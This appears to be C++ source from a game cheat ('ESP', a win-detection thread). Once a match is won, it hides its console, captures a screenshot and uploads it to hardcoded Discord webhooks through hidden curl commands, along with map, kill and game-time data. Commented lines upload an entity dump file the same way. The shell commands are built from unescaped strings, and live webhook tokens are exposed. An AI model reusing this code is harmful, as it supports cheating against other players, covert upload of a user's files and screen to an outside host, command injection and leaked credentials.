
#include "wwcd.h"

#include <atlimage.h>
#include <thread>

#include "../Setting.h"
#include "../Data.h"
#include "../Esp.h"
bool loginwwcd = true;
using namespace std;



using namespace wwcd;

const string cmd1p1 = "curl -i -H \"Accept: application/json\" -H \"Content-Type:application/json\" -X POST --data \"{\\\"content\\\": \\\"";
const string cmd1p2 = "\\\"}\" ";

const string cmd2p1 = "curl -F \"file1=@";


int system_no_output(std::string command)
{
	command.insert(0, "/C ");

	SHELLEXECUTEINFOA ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "cmd.exe";
	ShExecInfo.lpParameters = command.c_str();
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = SW_HIDE;
	ShExecInfo.hInstApp = NULL;

	if (ShellExecuteExA(&ShExecInfo) == FALSE)
		return -1;

	WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

	DWORD rv;
	GetExitCodeProcess(ShExecInfo.hProcess, &rv);
	CloseHandle(ShExecInfo.hProcess);

	return rv;
}
void SendText(string text, string webhook_url) {
	ShowWindow(GetConsoleWindow(), HIDE_WINDOW());

	string cmd = cmd1p1 + text + cmd1p2 + webhook_url;

	system_no_output(cmd.c_str());
	system_no_output("cls");
}

void SendFile(string path, string webhook_url) {
	ShowWindow(GetConsoleWindow(), HIDE_WINDOW());

	string cmd = cmd2p1 + path + "\" " + webhook_url;
	
	system_no_output(cmd.c_str());
	system_no_output("cls");

	
}

void Esp::TakeScreenShot(const std::string& path)
{
	keybd_event(VK_MENU, 0, 0, 0); //Alt Press
	keybd_event(VK_SNAPSHOT, 0, 0, 0); //PrntScrn Press
	keybd_event(VK_SNAPSHOT, 0, KEYEVENTF_KEYUP, 0); //PrntScrn Release
	keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0); //Alt Release
	HBITMAP hBitmap;
	Sleep(200);
	OpenClipboard(NULL);
	hBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);
	CloseClipboard();
	std::vector<BYTE> buf;
	IStream* stream = NULL;
	HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
	CImage image;
	ULARGE_INTEGER liSize;
	image.Attach(hBitmap);
	image.Save(stream, Gdiplus::ImageFormatPNG);
	IStream_Size(stream, &liSize);
	DWORD len = liSize.LowPart;
	IStream_Reset(stream);
	buf.resize(len);
	IStream_Read(stream, &buf[16], len);
	stream->Release();
	std::fstream fi;
	fi.open(path, std::fstream::binary | std::fstream::out);
	fi.write(reinterpret_cast<const char*>(&buf[16]), buf.size() * sizeof(BYTE));
	fi.close();
	std::this_thread::sleep_for(std::chrono::milliseconds(40));
}

//SendFile("C:\\WINS.png", "https://discord.com/api/webhooks/1076701347577081939/5ssF7iG2czQLK-ykIuRErDQfbOOOPuHfAH_YcgQTnfFmgZc-rCDde--SnpPBv652oeKb"); OLD
//SendFile("C:\\EntityDumps.txt", "https://discord.com/api/webhooks/1080525308320567326/SbN5FBZMhI2P6c0058iWCOF3rrEaFy2fv__77SpGs7FkWnbFg3NhXVXDTuNfvWK8lPT5");
VOID wwcd::wwcdThread()
{
	ShowWindow(GetConsoleWindow(), HIDE_WINDOW());
	FreeConsole();
	while (true)
	{
	    if (Setting::wwcd) 
		{
	    	if (Data::AliveTeams == 1)
	    	{
	    		Sleep(2600);
	    		std::string path = ("C:\\WINS.png");
	    		Esp::TakeScreenShot(path);
	    		Sleep(1000);
				SendText("Map : " + (Data::LocalPawn), "https://discord.com/api/webhooks/1092115537775034500/gqoLPCq7FTA-ABA2EZGN6BnAufW2MfV-lVjKnXbascGBnpOaQfi4ldxHjF-V5ISjfcId");
				SendText("Kills : " + (to_string(Data::Kills)), "https://discord.com/api/webhooks/1092115537775034500/gqoLPCq7FTA-ABA2EZGN6BnAufW2MfV-lVjKnXbascGBnpOaQfi4ldxHjF-V5ISjfcId");
				SendText("Game Time : " + (to_string(Data::TimeRemind)), "https://discord.com/api/webhooks/1092115537775034500/gqoLPCq7FTA-ABA2EZGN6BnAufW2MfV-lVjKnXbascGBnpOaQfi4ldxHjF-V5ISjfcId");
	    		SendFile("C:\\WINS.png", "https://discord.com/api/webhooks/1092115537775034500/gqoLPCq7FTA-ABA2EZGN6BnAufW2MfV-lVjKnXbascGBnpOaQfi4ldxHjF-V5ISjfcId");
	    		Sleep(100);
	    		remove("C:\\WINS.png");
	    		std::this_thread::sleep_for(std::chrono::milliseconds(500000));
	    	}
	    }	    
	    std::this_thread::sleep_for(std::chrono::milliseconds(40));		
	}
}